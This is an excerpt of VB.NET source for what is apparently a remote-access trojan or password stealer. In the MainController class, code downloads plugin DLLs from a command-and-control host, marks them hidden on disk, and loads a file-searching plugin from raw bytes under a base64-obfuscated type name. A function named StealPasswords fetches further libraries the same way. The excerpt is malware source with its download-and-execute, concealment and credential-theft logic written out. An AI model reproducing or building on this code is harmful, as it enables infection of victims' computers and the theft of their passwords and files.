...
Public Class MainController
        ...
        Try
            ...
            Try
                ...
                If Not (File.Exists(Path.Combine(Application.StartupPath, "Ionic.Zip.dll"))) Then
                    Socket.DownloadFile(C.Host & "/plugins/Ionic.Zip.dll", Path.Combine(Application.StartupPath, "Ionic.Zip.dll"))
                    File.SetAttributes(Path.Combine(Application.StartupPath, "Ionic.Zip.dll"), FileAttributes.Hidden)
                End If

                Dim PluginData As Byte() = Socket.DownloadData(C.Host & "/plugins/FileSearcher.dll")

                If (LoadDLL(PluginData, C.DEB("RmlsZVNlYXJjaGVyLkZpbGVTZWFyY2hlcg"), True, paramters) = True) Then
    ...
    Public Function StealPasswords()
        Try
            ...
            If Not (File.Exists(Path.Combine(Application.StartupPath, "Newtonsoft.Json.dll"))) Then
                Socket.DownloadFile(C.Host & "/plugins/Newtonsoft.Json.dll", Path.Combine(Application.StartupPath, "Newtonsoft.Json.dll"))
    ...
    Public Function LoadDLL(ByVal PluginBytes As Byte(), ByVal typeName As String, Optional ByVal hasParamters As Boolean = False, Optional ByVal paramter() As Object = Nothing)
        Try
